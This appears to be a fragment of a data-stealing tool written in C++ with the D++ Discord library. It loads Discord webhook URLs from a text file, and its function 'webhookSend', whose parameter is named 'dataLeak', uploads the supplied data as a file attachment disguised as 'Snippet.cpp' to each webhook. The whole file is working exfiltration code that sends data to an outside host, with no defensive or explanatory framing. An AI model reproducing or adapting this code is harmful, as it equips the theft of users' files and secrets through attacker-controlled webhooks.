#include <dpp/dpp.h>
#include <stdio.h>

#define PTHREAD_FUNCTION void *

std::vector<dpp::webhook> webhooks;

dpp::cluster bot("");

void initWebhook() {
    FILE * fp = fopen("webhookUrl.txt", "r");
    if (fp == nullptr) return;

    fseek(fp, 0, SEEK_END);

    size_t size = ftell(fp);
    rewind(fp);

    char *fileData = (char *)malloc(++size);
    if (fileData == nullptr) {
        fclose(fp);
        return;
    }

    fread(fileData, 1, size, fp);
    fclose(fp);
    fileData[size - 1] = '\n';

    char *offSet = fileData;
    for (int i = 0; i < size; i++) {
        if (fileData[i] == '\n') {
            if ((i && fileData[i - 1] == '\0') || i == 0) {
                offSet = fileData + i + 1;
                continue;
            }
            fileData[i] = '\0';
            printf("url: %s\n", offSet);
            webhooks.push_back(dpp::webhook(offSet));
            offSet = fileData + i + 1;
        }
    }

    free(fileData);
}

void webhookSend(char *dataLeak) {
    for (int i = webhooks.size() - 1; i >= 0; i--) {
        bot.execute_webhook_sync(webhooks[i], dpp::message("wakwak").add_file("Snippet.cpp", dataLeak));
    }
}
